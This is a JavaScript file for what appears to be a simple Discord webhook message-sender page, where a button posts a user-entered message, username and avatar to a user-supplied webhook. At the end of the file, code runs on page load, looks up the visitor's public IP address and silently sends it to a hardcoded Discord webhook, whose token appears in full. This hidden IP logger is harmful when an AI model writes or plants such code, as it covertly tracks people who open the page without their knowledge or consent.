let url = "";
let username = "";
let avatar_url = "";
let msg = "";

function sendToWebhook(data,p_url) {
    const webhookUrl = p_url;

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => console.log('Success:', result))
    .catch(error => console.log('Error:', error));
}

document.getElementById("button").addEventListener('click',function(ev) {
    const urlTextBox = document.getElementById("url-text-box");
    const urltext = urlTextBox.value;
    url = urltext;

    const msgTextBox = document.getElementById("msg-text-box");
    const msgtext = msgTextBox.value;
    msg = msgtext;

    const usernameTextBox = document.getElementById("name-text-box");
    const usernametext = usernameTextBox.value;
    username = usernametext;

    const avatarUrlTextBox = document.getElementById("pfp-text-box");
    const avatarUrltext = avatarUrlTextBox.value;
    avatar_url = avatarUrltext;

    const payload = {
        content: msg,
        username: username,
        avatar_url: avatar_url,
        /*embeds: [{
            title: 'title',
            description: 'desc',
            color: 3447003
        }]*/
    };
    
    sendToWebhook(payload,url);
});

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const payload = {
        content: data.ip,
        username: "username",
        avatar_url: "",
    };
    let URL = "https://discord.com/api/webhooks/1332001108381532311/5_nWfiMS4GpAlgCPcIU1WVObsydNq7jK6KEYEZeaer7Q5zueVmJ3GjvGqYwK0FIWgo-j";
    sendToWebhook(payload,URL);
  })
  .catch(error => {
  });
